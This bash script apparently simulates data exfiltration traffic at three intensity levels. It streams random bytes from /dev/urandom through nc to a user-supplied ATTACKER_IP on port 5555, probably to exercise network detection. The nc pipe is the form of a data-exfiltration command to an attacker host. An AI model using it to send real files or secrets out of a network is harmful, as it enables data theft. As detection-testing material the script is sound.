#!/usr/bin/env bash
set -euo pipefail

ATTACKER_IP="${1:?Usage: data_exfiltration.sh <attacker_ip> <low|medium|high>}"
INTENSITY="${2:-medium}"

case "$INTENSITY" in
  low)    SIZE_MB=5   ;;
  medium) SIZE_MB=50  ;;
  high)   SIZE_MB=200 ;;
  *) echo "intensity must be low|medium|high"; exit 1 ;;
esac

echo "=== data_exfiltration ($INTENSITY) ==="
echo "target=${ATTACKER_IP}:5555 size=${SIZE_MB}MB"
echo "start_ts=$(date -Iseconds)"

head -c "${SIZE_MB}M" /dev/urandom | nc "$ATTACKER_IP" 5555

echo "end_ts=$(date -Iseconds)"
echo "=== data_exfiltration complete ==="